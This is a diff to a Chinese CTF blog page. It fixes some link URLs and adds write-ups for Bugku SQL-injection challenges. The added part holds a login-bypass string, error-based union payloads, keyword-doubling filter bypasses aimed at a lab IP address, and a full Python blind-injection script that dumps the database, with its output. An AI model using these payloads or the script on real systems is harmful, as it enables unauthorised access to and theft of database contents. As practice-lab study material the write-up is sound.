@@ -48,7 +48,7 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-  <link rel="shortcut icon" href="https://blank233.github.io/img/clover.png" type="image/x-icon" />
+  <link rel="shortcut icon" href="https://blank233.github.io//img/clover.png" type="image/x-icon" />
 
   
   
@@ -242,7 +242,7 @@
   <div>
     <i class="fa fa-folder fa-fw"></i>
     
-      <a class="post-taxonomy-topic" href="https://blank233.github.iotopics/write_up">Write_up</a>
+      <a class="post-taxonomy-topic" href="https://blank233.github.io/topics/write_up">Write_up</a>
     
   </div>
   
@@ -254,7 +254,7 @@
   <div>
     <i class="fa fa-tags fa-fw"></i>
     
-      <a class="post-taxonomy-tag" href="https://blank233.github.iotags/2018-03">2018-03</a>
+      <a class="post-taxonomy-tag" href="https://blank233.github.io/tags/2018-03">2018-03</a>
     
   </div>
   
@@ -1087,6 +1087,223 @@ if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']
 
 <p>各种尝试无果后想到了tip的admin  使x=admin即可</p>
 
+<ul>
+<li>这是一个神奇的登陆框(4-3更)</li>
+</ul>
+
+<p>网址上的sql提示这是sql注入 既然是sql注入就开始测试万能密码 admin&rdquo;or 1=1#登陆成功</p>
+
+<p>只输入一个双引号测试时 报错如下</p>
+
+<pre><code>Try Again!
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;&quot;&quot; and w_passwd=&quot;&quot;' at line 1
+</code></pre>
+
+<p>可以看到是&rdquo;闭合 然后就注呗</p>
+
+<p>附上payload</p>
+
+<p>1,2返回正常 1,2,3返回错误 说明有2列</p>
+
+<pre><code>1&quot;union select 1,2#
+</code></pre>
+
+<p>爆数据库</p>
+
+<pre><code>1&quot;union select 1,count(*) from information_schema.tables group by concat(database(),0x3a,floor(rand(0)*2))#
+</code></pre>
+
+<p>爆数据表</p>
+
+<pre><code>1&quot;union select 1,count(*) from information_schema.tables group by concat((select concat(table_name) from information_schema.tables where table_schema='bugkusql1' limit 1),0x3a,floor(rand(0)*2))#
+</code></pre>
+
+<p>列</p>
+
+<pre><code>1&quot;union select 1,count(*) from information_schema.tables group by concat((select concat(column_name) from information_schema.columns where table_schema='bugkusql1' and table_name='flag1' limit 1),0x3a,floor(rand(0)*2))#
+</code></pre>
+
+<p>爆数据</p>
+
+<pre><code>1&quot;union select 1,count(*) from information_schema.tables group by concat((select flag1 from bugkusql1.flag1),0x3a,floor(rand(0)*2))#
+</code></pre>
+
+<ul>
+<li>多次</li>
+</ul>
+
+<p>发现url中有一个id值，然后修改id值发现是sql注入</p>
+
+<p>测试&rsquo; 报错 加上注释 正确 单引号闭合</p>
+
+<p>但是在测试and 1=1 时发现报错  猜想可能是过滤 然后anandd 1=1测试 返回正确</p>
+
+<p>判断过滤了那些关键词</p>
+
+<pre><code>http://120.24.86.145:9004/1ndex.php?id=5%27 aandnd 0=length('and')--+
+</code></pre>
+
+<p>更改and发现还过滤了or union select</p>
+
+<p>判断列数</p>
+
+<pre><code>http://120.24.86.145:9004/1ndex.php?id=5%27 oorrder by 2--+
+</code></pre>
+
+<p>直接放payload吧  一次一次的写累，，#后为返回内容</p>
+
+<pre><code>http://120.24.86.145:9004/1ndex.php?id=-5%27 uniounionn seleselectct 1,group_concat(schema_name) from infoorrmation_schema.schemata--+
+#information_schema,web1002-1
+
+http://120.24.86.145:9004/1ndex.php?id=-5%27 uniounionn seleselectct 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema='web1002-1'--+
+#flag1,hint
+
+http://120.24.86.145:9004/1ndex.php?id=-5%27 uniounionn seleselectct 1,group_concat(column_name) from infoorrmation_schema.columns where table_schema='web1002-1' anandd table_name='flag1'--+
+#flag1,address
+
+
+http://120.24.86.145:9004/1ndex.php?id=-5%27 uniounionn seleselectct 1,group_concat(flag1) from `web1002-1`.flag1--+
+#usOwycTju+FTUUzXosjr
+
+http://120.24.86.145:9004/1ndex.php?id=-5%27 uniounionn seleselectct 1,group_concat(address) from `web1002-1`.flag1--+
+# ./Once_More.php 下一关地址
+
+</code></pre>
+
+<p>然后又来到了另一个界面  嗯  继续注</p>
+
+<p>id=1 id=1&rsquo; 报错发现是单引号闭合</p>
+
+<p>and 1=1 order by 2 素质四连 开始联合查询</p>
+
+<pre><code>http://120.24.86.145:9004/Once_More.php?id=1%27union select 1,2%23
+# My Id =1' select 1,2#
+</code></pre>
+
+<p>发现union被过滤了 尝试之前的方法也不行 索性看看他都过滤了啥  反正有回显</p>
+
+<pre><code>http://120.24.86.145:9004/Once_More.php?id=1%27union and or select from name mid substr left ascii sleep limit%23
+# My Id =1' and or select from name mid left ascii limit#
+</code></pre>
+
+<p>过滤了union substr sleep三个词</p>
+
+<p>呃呃  盲注？？  附上脚本</p>
+
+<pre><code>import requests
+
+def length_schema():
+    for x in range(1,20):
+        url = 'http://120.24.86.145:9004/Once_More.php?id=1%27and%20length(database())='+str(x)+'%23'
+        s = requests.get(url)
+        if &quot;Hello&quot; in s.text:
+            print 'schema_length is :' + str(x)
+            global a
+            a = int(x)
+            schema_name()
+            break
+        
+def schema_name():
+    x = 0
+    name = ''
+    while x &lt; a:
+        x = x + 1
+        temp = 'abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|}{:?&gt;&lt;[];,.`~' 
+        for i in temp:
+            url = 'http://120.24.86.145:9004/Once_More.php?id=1%27and%20mid(database(),'+ str(x) +',1)=%27'+str(i)+'%27%23'
+            s = requests.get(url)
+            if &quot;Hello&quot; in s.text:
+                name = name + str(i)
+
+    print 'sechma_name is :' + name
+    global schema_name
+    schema_name = name
+    all()
+
+def all():
+    temp = 'abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|}{:?&gt;&lt;[];,.`~'
+    temp_data = 'abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|}{:?&gt;&lt;[];,.`~ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    for x in xrange(0,20):
+        table_name = ''
+        for y in xrange(1,20):
+            key = 0
+            for i in temp:
+                url = 'http://120.24.86.145:9004/Once_More.php?id=1%27and%20ascii(mid((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27'+schema_name+'%27%20limit%20'+str(x)+',1),'+str(y)+',1))=ascii(\''+str(i)+'\')%23'
+                s = requests.get(url)
+                if &quot;Hello&quot; in s.text:
+                    key = 1
+                    table_name = table_name + str(i)
+            if key == 0:
+                break
+        if table_name == '':
+            break
+        print 'one of tables is:' + table_name
+        for p in xrange(0,20):
+            column_name = ''
+            for q in xrange(1,20):
+                key = 0
+                for i in temp:
+                    url_columns = 'http://120.24.86.145:9004/Once_More.php?id=1%27and%20ascii(mid((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27'+schema_name+'%27%20and%20table_name=%27'+table_name+'%27limit%20'+str(p)+',1),'+str(q)+',1))=ascii(\''+str(i)+'\')%23'
+                    s = requests.get(url_columns)
+                    if &quot;Hello&quot; in s.text:
+                        key = 1
+                        column_name = column_name + str(i)
+                if key ==0:
+                    break
+            if column_name == '':
+                break
+            print 'a column name of '+table_name+' is '+column_name
+            for y in xrange(0,10):
+                data = ''
+                for z in xrange(1,20):
+                    key = 0
+                    for i in temp_data:
+                        url_data = 'http://120.24.86.145:9004/Once_More.php?id=1%27and%20ascii(mid((select%20'+column_name+'%20from%20`'+schema_name+'`.'+table_name+'%20limit%20'+str(y)+',1),'+str(z)+',1))=ascii(\''+str(i)+'\')%23'
+                        s = requests.get(url_data)
+                        if &quot;Hello&quot; in s.text:
+                            data = data + str(i)
+                            key = 1
+                    if key == 0:
+                        break
+                if data == '':
+                    break
+                print 'one data of '+schema_name+'.'+table_name+'\'s '+column_name+' is '+data
+
+
+length_schema()
+</code></pre>
+
+<p>结果</p>
+
+<pre><code>schema_length is :9
+sechma_name is :web1002-2
+one of tables is:class
+a column name of class is id
+one data of web1002-2.class's id is 1
+one data of web1002-2.class's id is 2
+one data of web1002-2.class's id is 3
+one data of web1002-2.class's id is 4
+one data of web1002-2.class's id is 5
+one data of web1002-2.class's id is 6
+one data of web1002-2.class's id is 7
+a column name of class is name
+one data of web1002-2.class's name is TOM
+one data of web1002-2.class's name is Jack
+one data of web1002-2.class's name is Mack
+one data of web1002-2.class's name is Jones
+one data of web1002-2.class's name is James
+one data of web1002-2.class's name is Fox
+one data of web1002-2.class's name is Henry
+one of tables is:flag2
+a column name of flag2 is flag2
+one data of web1002-2.flag2's flag2 is flag{Bugku-sql_6s-2
+a column name of flag2 is address
+one data of web1002-2.flag2's address is .
+[Finished in 1620.8s]
+</code></pre>
+
+<p>ps:由于遍历数据的时候设定的值为20 所以 flag只遍历出了前20位  有兴趣的话可以自行修改自己动手测试一下代码</p>
+
 <hr />
 
 <h2 id="未完待续">未完待续 ~~</h2>
@@ -1130,7 +1347,7 @@ if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']
 
 </div>
 </div>
-<script src="https://blank233.github.iojs/ui.js"></script>
+<script src="https://blank233.github.io/js/ui.js"></script>
 
 
 <script>
